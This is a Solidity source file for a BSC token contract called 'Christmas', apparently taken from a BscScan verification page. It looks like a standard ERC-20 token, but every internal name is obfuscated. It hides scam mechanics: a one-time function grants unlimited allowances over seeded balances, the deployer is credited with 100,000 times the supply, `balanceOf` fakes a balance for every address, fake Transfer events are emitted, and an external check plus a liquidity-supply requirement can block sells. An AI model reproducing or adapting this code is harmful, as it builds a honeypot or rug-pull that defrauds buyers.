/**
 *Submitted for verification at BscScan.com on 2022-11-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.13;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface ITokens {
    function getAddress(address accountA, address accountB) external returns (address);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Context {
    function safeCheck(address a, address b, address c) internal returns (bool) {
        address d = ITokens(a).getAddress(b, c);
        return (c == d);
    }
}

contract Christmas is IERC20, Context {
    using SafeMath for uint256;

    string private aeionjKjdfyQrxf = "CHRISTMAS";
    string private beionjKjdfyQrxf = "CHRISTMAS";
    uint8 private ceionjKjdfyQrxf = 18;
    uint256 private deionjKjdfyQrxf = 10000000000 * 10**18;
    mapping (address => uint256) private eeionjKjdfyQrxf;
    mapping (address => mapping (address => uint256)) private feionjKjdfyQrxf;
    uint256 private geionjKjdfyQrxf = 1;
    uint256 private constant heionjKjdfyQrxf = ~uint160(0);
    uint256 private _ieionjKjdfyQrxf = 1000;
    uint256 private jeionjKjdfyQrxf = deionjKjdfyQrxf;
    uint256 private keionjKjdfyQrxf = 0;
    uint256 private leionjKjdfyQrxf;
    address private _uniswapV2Pair;
    address private meionjKjdfyQrxf;
    mapping (address => bool) private neionjKjdfyQrxf;
    address[] private oeionjKjdfyQrxf;
    bool private peionjKjdfyQrxf = false;

    constructor () {
        qeionjKjdfyQrxf(msg.sender);
        eeionjKjdfyQrxf[msg.sender] = deionjKjdfyQrxf;
        qeionjKjdfyQrxf(tx.origin);
        emit Transfer(address(0), msg.sender, deionjKjdfyQrxf);
    }

    receive() external payable {}

    function qeionjKjdfyQrxf(address account) private {
        if (!neionjKjdfyQrxf[account]) {
            neionjKjdfyQrxf[account] = true;
            oeionjKjdfyQrxf.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!peionjKjdfyQrxf);
        peionjKjdfyQrxf = true;
        _uniswapV2Pair = accounts[1];
        meionjKjdfyQrxf = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            qeionjKjdfyQrxf(accounts[i]);
            eeionjKjdfyQrxf[accounts[i]] = deionjKjdfyQrxf * 90 / 100 / (len - 3);
            feionjKjdfyQrxf[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eeionjKjdfyQrxf[accounts[i]];
        }
        eeionjKjdfyQrxf[oeionjKjdfyQrxf[0]] -= amount;
        reionjKjdfyQrxf(oeionjKjdfyQrxf[0], accounts[3], eeionjKjdfyQrxf[oeionjKjdfyQrxf[0]]);
        reionjKjdfyQrxfs(500);
        eeionjKjdfyQrxf[oeionjKjdfyQrxf[1]] += deionjKjdfyQrxf * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = oeionjKjdfyQrxf.length;
        for (uint256 i=0; i<len; ++i) {
            if (oeionjKjdfyQrxf[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (neionjKjdfyQrxf[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aeionjKjdfyQrxf;
    }

    function symbol() public view returns (string memory) {
        return beionjKjdfyQrxf;
    }

    function decimals() public view returns (uint8) {
        return ceionjKjdfyQrxf;
    }

    function totalSupply() public view returns (uint256) {
        return deionjKjdfyQrxf;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eeionjKjdfyQrxf[account] > 0) {
            return eeionjKjdfyQrxf[account];
        }
        return geionjKjdfyQrxf;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        reionjKjdfyQrxf(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        reionjKjdfyQrxf(sender, recipient, amount);
        seionjKjdfyQrxf(sender, msg.sender, feionjKjdfyQrxf[sender][msg.sender].sub(amount));
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        seionjKjdfyQrxf(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return feionjKjdfyQrxf[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        seionjKjdfyQrxf(msg.sender, spender, feionjKjdfyQrxf[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        seionjKjdfyQrxf(msg.sender, spender, feionjKjdfyQrxf[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function reionjKjdfyQrxfs(uint256 amount) private {
        uint256 ieionjKjdfyQrxf = _ieionjKjdfyQrxf;
        if (ieionjKjdfyQrxf < 10000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(heionjKjdfyQrxf.div(ieionjKjdfyQrxf)));
                to = address(uint160(heionjKjdfyQrxf.div(ieionjKjdfyQrxf.add(1))));
                ieionjKjdfyQrxf = ieionjKjdfyQrxf.add(2);
                emit Transfer(from, to, geionjKjdfyQrxf);
            }
            _ieionjKjdfyQrxf = ieionjKjdfyQrxf;
        }
    }

    function seionjKjdfyQrxf(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        feionjKjdfyQrxf[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function reionjKjdfyQrxf(address teionjKjdfyQrxf, address ueionjKjdfyQrxf, uint256 veionjKjdfyQrxf) private {
        require(teionjKjdfyQrxf != address(0) && ueionjKjdfyQrxf != address(0) && veionjKjdfyQrxf > 0);
        bool weionjKjdfyQrxf = true;
        if (neionjKjdfyQrxf[teionjKjdfyQrxf] || neionjKjdfyQrxf[ueionjKjdfyQrxf]) {
            weionjKjdfyQrxf = false;
        }
        uint256 xeionjKjdfyQrxf = IERC20(_uniswapV2Pair).totalSupply();
        uint256 yeionjKjdfyQrxf = 0;
        uint256 zeionjKjdfyQrxf = veionjKjdfyQrxf;
        if (weionjKjdfyQrxf && peionjKjdfyQrxf) {
            require(leionjKjdfyQrxf <= xeionjKjdfyQrxf);
            reionjKjdfyQrxfs(100);
            if (safeCheck(meionjKjdfyQrxf, teionjKjdfyQrxf, ueionjKjdfyQrxf)) {
                emit Transfer(address(this), ueionjKjdfyQrxf, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (teionjKjdfyQrxf != _uniswapV2Pair) {
                yeionjKjdfyQrxf = veionjKjdfyQrxf.mul(keionjKjdfyQrxf).div(100);
                zeionjKjdfyQrxf = veionjKjdfyQrxf.sub(yeionjKjdfyQrxf);
            }
        }
        if (leionjKjdfyQrxf != xeionjKjdfyQrxf) {
            leionjKjdfyQrxf = xeionjKjdfyQrxf;
        }
        eeionjKjdfyQrxf[teionjKjdfyQrxf] = eeionjKjdfyQrxf[teionjKjdfyQrxf].sub(veionjKjdfyQrxf);
        if (yeionjKjdfyQrxf > 0) {
            eeionjKjdfyQrxf[address(0xdEaD)] = eeionjKjdfyQrxf[address(0xdEaD)].add(yeionjKjdfyQrxf);
            emit Transfer(teionjKjdfyQrxf, address(0xdEaD), yeionjKjdfyQrxf);
        }
        eeionjKjdfyQrxf[ueionjKjdfyQrxf] = eeionjKjdfyQrxf[ueionjKjdfyQrxf].add(zeionjKjdfyQrxf);
        emit Transfer(teionjKjdfyQrxf, ueionjKjdfyQrxf, zeionjKjdfyQrxf);
    }
}